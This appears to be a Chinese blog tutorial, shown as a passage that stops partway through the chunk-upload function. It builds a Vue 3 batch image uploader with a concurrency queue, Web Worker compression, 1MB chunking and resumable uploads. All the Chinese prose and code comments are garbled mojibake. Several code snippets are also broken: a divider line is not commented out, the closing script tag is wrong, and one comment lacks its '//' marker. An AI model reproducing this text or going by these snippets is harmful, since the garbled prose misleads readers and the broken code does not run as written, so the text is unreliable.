<p>1.å¹¶å‘æ§åˆ¶ï¼šé˜Ÿåˆ—æœºåˆ¶ + æœ€å¤§å¹¶å‘æ•°ï¼Œé¿å…åŒæ—¶ä¸Šä¼ å¤§é‡æ–‡ä»¶å¯¼è‡´æœåŠ¡ç«¯å¡é¡¿ã€‚</p>
<p>2.å›¾ç‰‡å‹ç¼©ï¼šé€šè¿‡Web Workeråå°å‹ç¼©ï¼Œä¸é˜»å¡ä¸»çº¿ç¨‹ã€‚</p>
<p>3.åˆ†å—ä¸Šä¼ ï¼šå¤§æ–‡ä»¶åˆ‡å‰²æˆ 1MB åˆ†ç‰‡ï¼Œé™ä½å•æ¬¡è¯·æ±‚å‹åŠ›ï¼Œæå‡æ•ˆç‡ã€‚</p>
<p>4.æ–­ç‚¹ç»­ä¼ ï¼šå­˜å‚¨å·²ä¸Šä¼ åˆ†å—ç¼–å·ï¼Œæ„å¤–ä¸­æ–­åä»æ–­ç‚¹ç»§ç»­ï¼Œé¿å…é‡å¤ä¸Šä¼ ã€‚</p>
<p>5.åŒé‡éªŒè¯ï¼šæœ¬åœ°è®°å½• + åç«¯æ ¡éªŒï¼Œé˜²æ­¢è„æ•°æ®ï¼ˆè®°å½•å­˜åœ¨ä½†æ–‡ä»¶ä¸¢å¤±ï¼‰ã€‚</p>
<p>6.å®æ—¶è¿›åº¦ï¼šæ¯ä¸ªåˆ†å—ä¸Šä¼ åæ›´æ–°è¿›åº¦æ¡ã€‚</p>
<p><strong>æ•ˆæœé¢„è§ˆï¼š</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5ebea7dcdea1404cbdff06ebe2b6eb33~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg546L5Zeo55qu:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767600435&amp;x-signature=hdLdGCgs66cSOobuoV5rzjaJEIs%3D" alt="upload.gif" loading="lazy"/></p>
<h2 data-id="heading-0">1.å‰ç«¯ç»“æ„åˆå§‹åŒ–</h2>
<p>é¦–å…ˆä½¿ç”¨ <code>vite</code> åˆ›å»ºä¸€ä¸ª <code>vue3</code> é¡¹ç›®å¹¶å®‰è£…ä¾èµ–æ’ä»¶å’Œ <code>element-plus</code> ç»„ä»¶åº“ï¼Œé¡¹ç›®ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-é¡¹ç›®ç»“æ„" lang="é¡¹ç›®ç»“æ„">ğŸ“¦upload_front
 â”£ ğŸ“‚src
 â”ƒ â”£ ğŸ“‚components
 â”ƒ â”ƒ â”— ğŸ“œHome.vue
 â”ƒ â”£ ğŸ“œApp.vue
 â”ƒ â”£ ğŸ“œmain.js
 â”£ ğŸ“œindex.html
 â”£ ğŸ“œpackage.json
 â”£ ğŸ“œvite.config.js
</code></pre>
<p>æ¥ä¸‹æ¥ï¼Œåœ¨ <code>components/Home.vue</code> ä¸­åˆå§‹åŒ–é¡µé¢ç»“æ„ï¼ŒåŒæ—¶å®šä¹‰æ•°æ®å’Œäº‹ä»¶å¤„ç†å‡½æ•°ã€‚<code>Home.vue </code>ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-Home.vue" lang="Home.vue">&lt;div&gt;
    &lt;el-upload 
      ref="uploadRef" 
      multiple
      accept="image/png,image/jpeg"
      :before-upload="beforeUpload"
      :http-request="customHttpRequest"
      :on-change="handleFileChange"
      :file-list="fileList"
      :auto-upload="false"
    &gt;
      &lt;el-button type="primary"&gt;æ‰¹é‡ä¸Šä¼ å›¾ç‰‡&lt;/el-button&gt;
    &lt;/el-upload&gt;
    &lt;div&gt;
      &lt;el-button type="primary" @click="startUpload"&gt;å¼€å§‹ä¸Šä¼ &lt;/el-button&gt;
    &lt;/div&gt;
    &lt;div v-for="file in uploadStatus" :key="file.uid" style="margin-top: 15px;"&gt;
      &lt;div style="margin-bottom: 5px;"&gt;
        &lt;span&gt;{{ file.name }}&lt;/span&gt;
        &lt;span v-if="file.status === 'success'" style="color: #67c23a; margin-left: 10px;"&gt;âœ“ ä¸Šä¼ æˆåŠŸ&lt;/span&gt;
        &lt;span v-if="file.status === 'error'" style="color: #f56c6c; margin-left: 10px;"&gt;âœ— ä¸Šä¼ å¤±è´¥&lt;/span&gt;
      &lt;/div&gt;
      &lt;el-progress 
        :percentage="Math.floor(file.progress)" 
        :status="file.status === 'success' ? 'success' : file.status === 'error' ? 'exception' : ''"
      /&gt;
    &lt;/div&gt;
&lt;/div&gt;

&lt;script setup&gt;
    import { ref, onMounted, onUnmounted } from 'vue'
    import { ElMessage } from 'element-plus'
    import request from '@/utils/request'

    ----- å®šä¹‰æ•°æ® -----
    const fileList = ref([])  // æ–‡ä»¶åˆ—è¡¨
    const uploadStatus = ref([])  // ä¸Šä¼ çŠ¶æ€åˆ—è¡¨
    const uploadRef = ref(null)  // ä¸Šä¼ ç»„ä»¶å¼•ç”¨

    let uploadQueue = []  // ä¸Šä¼ é˜Ÿåˆ—
    let currentUploads = 0  // å½“å‰æ­£åœ¨ä¸Šä¼ çš„æ•°é‡
    let worker = null  // Workerå®ä¾‹

    // é…ç½®å‚æ•°
    const maxConcurrentUploads = 3  // æœ€å¤§å¹¶å‘ä¸Šä¼ æ•°
    const maxSizeInMB = 10  // æœ€å¤§æ–‡ä»¶å¤§å°ï¼ˆMBï¼‰
    const CHUNK_SIZE = 1 * 1024 * 1024  
    
    // äº‹ä»¶å¤„ç†å‡½æ•°
    const handleFileChange = () =&gt; {}
    const beforeUpload = () =&gt; {}
    const customHttpRequest = () =&gt; {}
    const startUpload = () =&gt; {}

&lt;script&gt;
</code></pre>
<p>ç®€å•è§£é‡Šä¸€ä¸‹æ¯”è¾ƒé‡è¦çš„æ•°æ®å®šä¹‰å’Œäº‹ä»¶å¤„ç†å‡½æ•°ï¼š</p>
<p><strong>uploadStatus</strong>ï¼š ä¸ºçŠ¶æ€åˆ—è¡¨ï¼Œæ”¶é›†è¦ä¸Šä¼ çš„å›¾ç‰‡æ•°æ®ã€‚</p>
<p><strong>uploadQueue</strong>ï¼š ä¸Šä¼ é˜Ÿåˆ—ï¼Œç»“åˆæœ€å¤§å¹¶å‘æ•°æ§åˆ¶ä¸Šä¼ æ•°é‡ã€‚</p>
<p><strong>currentUploads</strong>ï¼š ç›‘å¬æ­£åœ¨ä¸Šä¼ çš„å›¾ç‰‡æ•°é‡ï¼Œå¦‚æœå°äº <code>maxConcurrentUploads</code> åˆ™ç»§ç»­æ‰§è¡Œä¸Šä¼ é˜Ÿåˆ—ä¸­çš„å›¾ç‰‡ä¸Šä¼ ã€‚</p>
<p><strong>CHUNK_SIZE</strong>ï¼šè®¾ç½®åˆ†å—å¤§å°ï¼ˆMBï¼‰ã€‚</p>
<p><strong>handleFileChange</strong>ï¼šç”¨æˆ·é€‰æ‹©æ–‡ä»¶æ—¶è§¦å‘ã€‚</p>
<p><strong>beforeUpload</strong>ï¼šç”¨æˆ·ä¸Šä¼ å‰å¯¹æ–‡ä»¶çš„æ ¡éªŒã€‚</p>
<p><strong>customHttpRequest</strong>ï¼šä¸Šä¼ æ—¶è‡ªå®šä¹‰çš„å¤„ç†äº‹ä»¶é€»è¾‘ã€‚</p>
<h2 data-id="heading-1">2.å®šä¹‰è¾…åŠ©äº‹ä»¶å¤„ç†å‡½æ•°</h2>
<p>å‰ç«¯åˆå§‹åŒ–ç»“æ„å®Œæˆåï¼Œç»§ç»­å†ç¼–å†™ä¸¤ä¸ªè¾…åŠ©å‡½æ•°</p>
<p>1ï¸âƒ£ <strong>getFileIdentifier</strong>: å»é‡åˆ¤æ–­ï¼Œç”Ÿæˆå”¯ä¸€çš„æ–‡ä»¶æ ‡è¯†ç¬¦ï¼Œç”¨äºæ–­ç‚¹ç»­ä¼ å’Œåˆ†å—ç®¡ç†ã€‚</p>
<pre><code class="hljs language-javasscript" lang="javasscript">
/**
 * ç”Ÿæˆæ–‡ä»¶çš„å”¯ä¸€æ ‡è¯†ï¼ˆåŸºäºåŸå§‹æ–‡ä»¶ä¿¡æ¯ï¼‰
 * è§„åˆ™ï¼šæ–‡ä»¶å_æ–‡ä»¶å¤§å°_æœ€åä¿®æ”¹æ—¶é—´
 * å³ä½¿å‹ç¼©åï¼Œä¹Ÿä½¿ç”¨åŸå§‹æ–‡ä»¶ä¿¡æ¯ç”ŸæˆIDï¼Œç¡®ä¿ä¸åŒæ–‡ä»¶IDä¸åŒ
 */
const getFileIdentifier = (file) =&gt; {
  // å¦‚æœæ–‡ä»¶æœ‰åŸå§‹ä¿¡æ¯ï¼ˆå‹ç¼©åçš„æ–‡ä»¶ï¼‰ï¼Œä½¿ç”¨åŸå§‹ä¿¡æ¯
  const originalFile = file._originalFile || file
  
  const safeName = originalFile.name.replace(/[^a-zA-Z0-9.-]/g, '_')
  return `${safeName}_${originalFile.size}_${originalFile.lastModified}`
}
</code></pre>
<p>2ï¸âƒ£ <strong>updateUploadProgress</strong>: æ›´æ–°æ–‡ä»¶çš„ä¸Šä¼ è¿›åº¦å’ŒçŠ¶æ€ï¼Œç”¨äºæ˜¾ç¤ºè¿›åº¦æ¡ã€‚</p>
<pre><code class="hljs language-javasscript" lang="javasscript">
const updateUploadProgress = (uid, progress, status) =&gt; {
  const statusItem = uploadStatus.value.find(item =&gt; item.uid === uid)
  if (statusItem) {
    statusItem.progress = progress
    statusItem.status = status
  }
}
</code></pre>
<h2 data-id="heading-2">3.æ·»åŠ é€‰ä¸­çš„å›¾ç‰‡è‡³ä¸Šä¼ åˆ—è¡¨</h2>
<p>åœ¨ <code>handleFileChange</code> äº‹ä»¶å‡½æ•°ä¸­å°†ç”¨æˆ·ä¸Šä¼ çš„å›¾ç‰‡æ·»åŠ åˆ° <code>uploadStatus</code> æ•°ç»„ä¸­ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">handleFileChange</span> = (<span class="hljs-params">file, fileListData</span>) =&gt; {
  fileList.<span class="hljs-property">value</span> = fileListData
  
  <span class="hljs-comment">// æ£€æŸ¥åˆ¤æ–­æ˜¯å¦å·²ç»æ·»åŠ è¿‡è¿™ä¸ªå›¾ç‰‡ï¼Œå¦‚æœidç›¸åŒä»£è¡¨è¯¥å›¾ç‰‡å·²å­˜åœ¨ï¼Œç›´æ¥å¿½ç•¥</span>
  <span class="hljs-keyword">const</span> exists = uploadStatus.<span class="hljs-property">value</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">uid</span> === file.<span class="hljs-property">uid</span>)
  <span class="hljs-keyword">if</span> (!exists) {
    uploadStatus.<span class="hljs-property">value</span>.<span class="hljs-title function_">push</span>({
      <span class="hljs-attr">uid</span>: file.<span class="hljs-property">uid</span>, <span class="hljs-comment">// å›¾ç‰‡ID</span>
      <span class="hljs-attr">name</span>: file.<span class="hljs-property">name</span>, å›¾ç‰‡åç§°
      <span class="hljs-attr">progress</span>: <span class="hljs-number">0</span>, <span class="hljs-comment">// ä¸Šä¼ è¿›åº¦ï¼Œåˆå§‹åŒ–ä¸º0</span>
      <span class="hljs-attr">status</span>: <span class="hljs-string">'pending'</span> <span class="hljs-comment">// ä¸Šä¼ çŠ¶æ€ï¼Œé»˜è®¤å€¼ä¸ºpending</span>
    })
  }
}
</code></pre>
<p>æ³¨æ„ï¼šåœ¨å›¾ç‰‡ä¸Šä¼ åˆ°æ•°ç»„ä¹‹å‰ï¼Œæ·»åŠ ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœè¯¥å›¾ç‰‡å·²å­˜åœ¨åˆ™ç›´æ¥å¿½ç•¥ï¼Œé¿å…ç›¸åŒå›¾ç‰‡é‡å¤ä¸Šä¼ ã€‚</p>
<h2 data-id="heading-3">4.åˆ›å»ºWeb Workerç‹¬ç«‹çº¿ç¨‹å‹ç¼©å›¾ç‰‡</h2>
<p>åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹æ–°å»º <code>utils</code> æ–‡ä»¶å¤¹ï¼Œç„¶ååˆ›å»ºä¸€ä¸ª <code>imageWorker.js</code> æ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-imageWorkder.js" lang="imageWorkder.js">// imageWorker.js - ä½¿ç”¨ç°ä»£ Web Worker API
self.onmessage = async function (e) {
  const { file, quality, targetFormat, taskId } = e.data;

  try {
    const compressedFile = await compressImage(file, quality, targetFormat);
    // è¿”å›æ—¶å¸¦ä¸Š taskIdï¼Œç¡®ä¿æ¶ˆæ¯å¯¹åº”æ­£ç¡®
    self.postMessage({ 
      success: true, 
      file: compressedFile,
      taskId: taskId  // å…³é”®ï¼šè¿”å›ä»»åŠ¡ID
    })
  } catch (error) {
    self.postMessage({ 
      success: false, 
      error: error.message,
      taskId: taskId
    })
  }
}

const compressImage = async (file, quality, format) =&gt; {
  // ä½¿ç”¨ createImageBitmap æ›¿ä»£ new Image()
  const imageBitmap = await createImageBitmap(file)
  
  // ä½¿ç”¨ OffscreenCanvas æ›¿ä»£ document.createElement('canvas')
  const canvas = new OffscreenCanvas(imageBitmap.width, imageBitmap.height)
  const ctx = canvas.getContext('2d')
  
  // ç»˜åˆ¶å›¾ç‰‡åˆ°ç¦»å±ç”»å¸ƒ
  ctx.drawImage(imageBitmap, 0, 0)
  
  // è½¬æ¢ä¸º Blobï¼Œæ”¯æŒæ ¼å¼è½¬æ¢å’Œè´¨é‡å‹ç¼©
  const blob = await canvas.convertToBlob({
    type: `image/${format}`,
    quality: quality
  })
  
  // å°† Blob è½¬æ¢ä¸º File
  const compressedFile = new File([blob], file.name, {
    type: `image/${format}`,
    lastModified: Date.now(),
  });
  
  // é‡Šæ”¾ ImageBitmap èµ„æº
  imageBitmap.close();
  return compressedFile;
}

</code></pre>
<p><code>imageWorker.js</code> åˆ©ç”¨ <code>Web Worker</code> ç‹¬ç«‹çº¿ç¨‹å‹ç¼©ä¸Šä¼ å›¾ç‰‡ï¼Œé¿å…é˜»å¡ä¸»çº¿ç¨‹ï¼Œç¡®ä¿å›¾ç‰‡å‹ç¼©æœŸé—´é¡µé¢æµç•…ä¸å¡é¡¿ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼šWeb Workerä¸­ä¸è¦ä½¿ç”¨ <code>new Image</code> æˆ–è€… <code>document.createElement</code>è¿™ç§APIï¼Œè¦æ›´æ¢ä¸º <code>createImageBitmap</code> å’Œ <code>OffscreenCanvas</code></p>
<p>æ›´å¤šå…·ä½“çš„æ“ä½œï¼Œå¯ä»¥æŸ¥è¯¢ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FAPI%2FWeb_Workers_API%2FFunctions_and_classes_available_to_workers" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Workers_API/Functions_and_classes_available_to_workers" ref="nofollow noopener noreferrer">Web Workers å¯ä»¥ä½¿ç”¨çš„å‡½æ•°å’Œç±»</a> æ–‡æ¡£ã€‚</p>
<p>å®Œæˆ <code>imageWorker.js</code>åï¼Œå°†å…¶å¯¼å…¥é¡µé¢ä¸­ï¼Œå¹¶åœ¨ <code>onMounted</code> åˆå§‹åŒ–ï¼Œåœ¨ <code>onUnMounted</code> ç»„ä»¶å¸è½½æ—¶é”€æ¯ Worker é‡Šæ”¾å†…å­˜ã€‚</p>
<pre><code class="hljs language-Home.vue" lang="Home.vue">......
import { ref, onMounted, onUnmounted } from 'vue'
let worker = null

//ç»„ä»¶æŒ‚è½½æ—¶åˆå§‹åŒ–Worker
onMounted(() =&gt; {
  worker = new Worker(new URL('@/utils/imageWorker.js', import.meta.url))
  console.log('Worker å·²åˆå§‹åŒ–')
})

//ç»„ä»¶å¸è½½æ—¶æ¸…ç†Wokker
onUnmounted(() =&gt; {
  if (worker) {
    worker.terminate()
    worker = null
    console.log('Worker å·²æ¸…ç†')
  }
})
</code></pre>
<h2 data-id="heading-4">5.æ£€æŸ¥æ–‡ä»¶å¤§å°å¹¶å‹ç¼©</h2>
<p>æ¥ä¸‹æ¥åœ¨ <code>beforeUpload</code> äº‹ä»¶å¤„ç†å‡½æ•°ä¸­ï¼Œæ ¡éªŒä¸Šä¼ å›¾ç‰‡å¤§å°å¹¶å¼‚æ­¥è°ƒç”¨ <code>Workder</code> å®ç°å›¾ç‰‡å‹ç¼©ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">beforeUpload</span> = (<span class="hljs-params">file</span>) =&gt; {
  <span class="hljs-comment">// æ£€æŸ¥æ–‡ä»¶å¤§å°</span>
  <span class="hljs-keyword">const</span> isUnderLimit = file.<span class="hljs-property">size</span> / <span class="hljs-number">1024</span> / <span class="hljs-number">1024</span> &lt; maxSizeInMB
  <span class="hljs-keyword">if</span> (!isUnderLimit) {
    <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`æ–‡ä»¶å¤§å°ä¸èƒ½è¶…è¿‡<span class="hljs-subst">${maxSizeInMB}</span>MB`</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
  }

  <span class="hljs-comment">// æ‰€æœ‰å›¾ç‰‡éƒ½ä½¿ç”¨ Worker å‹ç¼©ï¼ˆæ— è®ºå¤§å°ï¼‰</span>
  <span class="hljs-keyword">if</span> (worker) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-comment">// ç”Ÿæˆå”¯ä¸€ä»»åŠ¡IDï¼Œé¿å…å¤šä¸ªæ–‡ä»¶åŒæ—¶å‹ç¼©æ—¶æ··ä¹±</span>
      <span class="hljs-keyword">const</span> taskId = <span class="hljs-string">`<span class="hljs-subst">${file.name}</span>_<span class="hljs-subst">${file.size}</span>_<span class="hljs-subst">${<span class="hljs-built_in">Date</span>.now()}</span>_<span class="hljs-subst">${<span class="hljs-built_in">Math</span>.random()}</span>`</span>
      
      <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleMessage</span> = (<span class="hljs-params">event</span>) =&gt; {
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯å½“å‰ä»»åŠ¡çš„å“åº”</span>
        <span class="hljs-keyword">if</span> (event.<span class="hljs-property">data</span>.<span class="hljs-property">taskId</span> === taskId) {
          worker.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'message'</span>, handleMessage)
          worker.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'error'</span>, handleError)
          
          <span class="hljs-keyword">if</span> (event.<span class="hljs-property">data</span>.<span class="hljs-property">success</span>) {
            <span class="hljs-comment">// å‹ç¼©åçš„æ–‡ä»¶</span>
            <span class="hljs-keyword">const</span> compressedFile = event.<span class="hljs-property">data</span>.<span class="hljs-property">file</span>
            
            <span class="hljs-comment">// å…³é”®ï¼šç»™å‹ç¼©åçš„æ–‡ä»¶æ·»åŠ åŸå§‹æ–‡ä»¶ä¿¡æ¯</span>
            <span class="hljs-comment">// è¿™æ ·å¯ä»¥ç¡®ä¿æ–‡ä»¶IDçš„å”¯ä¸€æ€§å’Œä¸€è‡´æ€§</span>
            compressedFile.<span class="hljs-property">_originalFile</span> = {
              <span class="hljs-attr">name</span>: file.<span class="hljs-property">name</span>,
              <span class="hljs-attr">size</span>: file.<span class="hljs-property">size</span>,
              <span class="hljs-attr">lastModified</span>: file.<span class="hljs-property">lastModified</span>
            }
            
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">${file.name}</span>] å‹ç¼©å®Œæˆ: <span class="hljs-subst">${file.size}</span> -&gt; <span class="hljs-subst">${compressedFile.size}</span> å­—èŠ‚`</span>)
            <span class="hljs-title function_">resolve</span>(compressedFile)
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`[<span class="hljs-subst">${file.name}</span>] å‹ç¼©å¤±è´¥:`</span>, event.<span class="hljs-property">data</span>.<span class="hljs-property">error</span>)
            <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(event.<span class="hljs-property">data</span>.<span class="hljs-property">error</span>))
          }
        }
      }
      
      <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleError</span> = (<span class="hljs-params">error</span>) =&gt; {
        worker.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'message'</span>, handleMessage)
        worker.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'error'</span>, handleError)
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`[<span class="hljs-subst">${file.name}</span>] Worker é”™è¯¯:`</span>, error)
        <span class="hljs-title function_">reject</span>(error)
      }
      
      worker.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'message'</span>, handleMessage)
      worker.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'error'</span>, handleError)
      
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">${file.name}</span>] å¼€å§‹å‹ç¼©... (ä»»åŠ¡ID: <span class="hljs-subst">${taskId}</span>)`</span>)
      worker.<span class="hljs-title function_">postMessage</span>({ 
        file, 
        <span class="hljs-attr">quality</span>: <span class="hljs-number">0.8</span>,           <span class="hljs-comment">// å‹ç¼©è´¨é‡ 0.8</span>
        <span class="hljs-attr">targetFormat</span>: <span class="hljs-string">'jpeg'</span>,   <span class="hljs-comment">// ç›®æ ‡æ ¼å¼ JPEG</span>
        taskId                  <span class="hljs-comment">// ä¼ é€’ä»»åŠ¡ID</span>
      })
   })

   <span class="hljs-comment">// å¦‚æœ Worker æœªåˆå§‹åŒ–ï¼Œç›´æ¥é€šè¿‡</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">${file.name}</span>] Worker æœªåˆå§‹åŒ–ï¼Œä¸å‹ç¼©`</span>)
  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>
}
</code></pre>
<p>ç®€è¿°ä¸€ä¸‹å‡ ä¸ªå…³é”®ç‚¹ï¼š</p>
<p>1ï¸âƒ£ Promise + taskId å¼‚æ­¥å‹ç¼©ï¼Œé€šè¿‡ taskId åŒ¹é…ï¼Œå¹¶å‘å‹ç¼©æ—¶åŒºåˆ†æ–‡ä»¶ï¼Œé˜²æ­¢è¿”å›ç»“æœæ··ä¹±ã€‚</p>
<p>2ï¸âƒ£ åœ¨å‹ç¼©åçš„æ–‡ä»¶ä¸Šé™„åŠ Â <code>_originalFile</code>ï¼Œç¡®ä¿åç»­ç”Ÿæˆçš„Â fileId åŸºäºåŸå§‹æ–‡ä»¶ï¼Œä¿è¯åç»­å®ç°æ–­ç‚¹ç»­ä¼ æ—¶çš„ä¸€è‡´æ€§ã€‚</p>
<h2 data-id="heading-5">6.é˜Ÿåˆ—æ§åˆ¶åŒæ—¶ä¸Šä¼ å¹¶å‘æ•°</h2>
<p>ç»§ç»­å®šä¹‰ä¸€ä¸ªå¤„ç†ä¸Šä¼ é˜Ÿåˆ—çš„äº‹ä»¶å‡½æ•°ï¼Œå¹¶åœ¨ä¸Šä¼ è‡ªå®šä¹‰äº‹ä»¶ <code>customHttpRequest</code> è¿›è¡Œè°ƒç”¨ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">customHttpRequest</span> = (<span class="hljs-params">options</span>) =&gt; {
  <span class="hljs-keyword">const</span> { file, onProgress, onError, onSuccess } = options
  
  <span class="hljs-comment">// å°†æ–‡ä»¶å’Œå›è°ƒå‡½æ•°åŒ…è£…åˆ°é˜Ÿåˆ—ä¸­</span>
  uploadQueue.<span class="hljs-title function_">push</span>({
    file,
    onProgress,
    onError,
    onSuccess,
    <span class="hljs-attr">uid</span>: file.<span class="hljs-property">uid</span>
  })
  
  <span class="hljs-comment">// å¼€å§‹å¤„ç†é˜Ÿåˆ—</span>
  <span class="hljs-title function_">processQueue</span>()
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">processQueue</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">while</span> (currentUploads &lt; maxConcurrentUploads &amp;&amp; uploadQueue.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
    <span class="hljs-keyword">const</span> nextFile = uploadQueue.<span class="hljs-title function_">shift</span>()
    <span class="hljs-keyword">if</span> (nextFile) {
      ......
    }
  }
}
</code></pre>
<p><code>processQueue</code> çš„ä½œç”¨æ§åˆ¶æœ€å¤§ä¸Šä¼ å¹¶å‘æ•°ï¼Œå¦‚æœå½“å‰ä¸Šä¼ æ•°é‡å°äºæœ€å¤§å¹¶å‘æ•°ï¼Œåˆ™ä»å¾…ä¸Šä¼ é˜Ÿåˆ—ä¸­å–å‡ºä¸‹ä¸€ä¸ªæ–‡ä»¶ï¼Œå¡«æ»¡å¹¶å‘æ•°ã€‚åœ¨ä¿è¯ä¸Šä¼ æ•ˆç‡çš„åŒæ—¶å°½é‡é¿å…æœåŠ¡å™¨å‹åŠ›è¿‡å¤§ã€‚</p>
<h2 data-id="heading-6">7.åˆ†å—ä¸Šä¼ å¹¶æ”¯æŒæ–­ç‚¹ç»­ä¼ </h2>
<p>æˆ‘ä»¬å†æ¥å®šä¹‰ä¸€ä¸ªäº‹ä»¶å¤„ç†å‡½æ•°ï¼Œå°†ä¸Šä¼ çš„æ–‡ä»¶æ‹†åˆ†æˆå¤šä¸ªåˆ†å—ã€‚</p>
<p>ä»è€Œå®ç°åˆ†å—ä¸Šä¼ Â + æ–­ç‚¹ç»­ä¼  + å¤±è´¥é‡è¯• + æ–‡ä»¶åˆå¹¶çš„å®Œæ•´æµç¨‹ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">uploadFileWithChunks</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">fileData</span>) =&gt; {
  currentUploads++
  <span class="hljs-keyword">const</span> file = fileData.<span class="hljs-property">file</span>
  
  <span class="hljs-comment">// è·å–æ–‡ä»¶åï¼ˆå¯èƒ½æ˜¯å‹ç¼©åçš„æ–‡ä»¶ï¼Œéœ€è¦ç”¨åŸå§‹æ–‡ä»¶åï¼‰</span>
  <span class="hljs-keyword">const</span> fileName = file.<span class="hljs-property">_originalFile</span> ? file.<span class="hljs-property">_originalFile</span>.<span class="hljs-property">name</span> : file.<span class="hljs-property">name</span>
  
  <span class="hljs-comment">// ç”Ÿæˆæ–‡ä»¶IDï¼ˆä½¿ç”¨åŸå§‹æ–‡ä»¶ä¿¡æ¯ï¼‰</span>
  <span class="hljs-keyword">const</span> fileId = <span class="hljs-title function_">getFileIdentifier</span>(file)
  
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// è®¡ç®—æ€»åˆ†å—æ•°</span>
    <span class="hljs-keyword">const</span> totalChunks = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">ceil</span>(file.<span class="hljs-property">size</span> / <span class="hljs-variable constant_">CHUNK_SIZE</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">${fileName}</span>] æ€»å…± <span class="hljs-subst">${totalChunks}</span> å—ï¼Œæ¯å— 1MB`</span>)
    
    <span class="hljs-comment">// ä» localStorage è¯»å–å·²ä¸Šä¼ çš„åˆ†å—ï¼ˆæ–­ç‚¹ç»­ä¼ ï¼‰</span>
    <span class="hljs-keyword">const</span> progressKey = <span class="hljs-string">`upload_<span class="hljs-subst">${fileId}</span>`</span>
    <span class="hljs-keyword">let</span> uploadedChunks = []
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> saved = <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(progressKey)
      <span class="hljs-keyword">if</span> (saved) {
        uploadedChunks = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(saved).<span class="hljs-property">chunks</span> || []
      }
    } <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[<span class="hljs-subst">${fileName}</span>] æ— æ–­ç‚¹è®°å½•ï¼Œä»å¤´å¼€å§‹`</span>)
    }
    
    <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ‰€æœ‰åˆ†å—éƒ½å·²ä¸Šä¼ ï¼ˆæ–‡ä»¶å·²å®Œæˆï¼‰</span>
    <span class="hljs-keyword">if</span> (uploadedChunks.<span class="hljs-property">length</span> === totalChunks) {
     
      <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// ç¬¬äºŒé‡éªŒè¯ï¼šè°ƒç”¨åç«¯æ¥å£ç¡®è®¤æ–‡ä»¶æ˜¯å¦çœŸå®å­˜åœ¨</span>
        <span class="hljs-keyword">await</span> request.<span class="hljs-title function_">post</span>(<span class="hljs-string">'/merge-chunks'</span>, {
          <span class="hljs-attr">filename</span>: fileName,
          <span class="hljs-attr">fileId</span>: fileId,
          totalChunks
        })  
      
        <span class="hljs-comment">// æ–‡ä»¶ç¡®å®å­˜åœ¨ï¼Œè·³è¿‡é‡å¤ä¸Šä¼ </span>
        <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(progressKey)
        currentUploads--
